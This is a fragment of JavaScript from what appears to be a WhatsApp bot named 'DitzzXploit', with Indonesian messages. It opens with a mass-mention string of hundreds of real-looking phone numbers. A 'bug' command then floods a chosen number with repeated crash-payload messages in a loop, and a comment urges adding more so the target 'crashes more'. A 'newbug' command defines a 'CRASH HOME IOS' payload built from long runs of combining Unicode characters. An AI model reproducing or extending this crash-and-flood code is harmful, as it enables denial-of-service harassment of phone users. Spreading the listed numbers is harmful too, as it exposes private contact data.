~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~
_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~
_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*
*_~`
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await DitzzXploit.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
  DitzzXploit.sendMessage(prrkek, {text: `Paket Datang Dari ${pushname}

${bugss}
${kroco}`}, {quoted: qbug})
  await sleep(5000)
  DitzzXploit.sendMessage(prrkek, {text: `Paket Datang Dari ${pushname}

${bugss}
${kroco}`}, {quoted: qbug})
 await sleep(5000)
DitzzXploit.sendMessage(prrkek, {text: `Paket Datang Dari ${pushname}

${bugss}
${kroco}`}, {quoted: qbug})
await sleep(5000)
  DitzzXploit.sendMessage(prrkek, {text: `Paket Datang Dari ${pushname}

${bugss}
${kroco}`}, {quoted: qbug})
 await sleep(5000)
DitzzXploit.sendMessage(prrkek, {text: `Paket Datang Dari ${pushname}

${bugss}
${kroco}`}, {quoted: qbug})
await sleep(5000)
  DitzzXploit.sendMessage(prrkek, {text: `Paket Datang Dari ${pushname}

${bugss}`}, {quoted: qbug})
 await sleep(5000)
DitzzXploit.sendMessage(prrkek, {text: `Paket Datang Dari ${pushname}

${bugss}
${kroco}`}, {quoted: qbug})
await sleep(5000)
  DitzzXploit.sendMessage(prrkek, {text: `Paket Datang Dari ${pushname}
${kroco}
${bugss}`}, {quoted: qbug})
 await sleep(5000)
DitzzXploit.sendMessage(prrkek, {text: `Paket Datang Dari ${pushname}

${bugss} ${kroco}`}, {quoted: qbug})
await sleep(5000)
  DitzzXploit.sendMessage(prrkek, {text: `Paket Datang Dari ${pushname}

${bugss} ${kroco}`}, {quoted: qbug})
 await sleep(5000)
DitzzXploit.sendMessage(prrkek, {text: `Paket Datang Dari ${pushname}

${bugss} ${kroco}`}, {quoted: qbug})
}
//Tambahin sesuai sama lu, biar makin crash
reply(`Succes Send Bug Ke ${prrkek} deangan jumlah ${jumlah}`)
    
}
break
case "newbug":{
  if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
  let bugss = `📱 𝐂𝐑𝐀𝐒𝐇 𝐇𝐎𝐌𝐄 𝐈𝐎𝐒 🍏ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬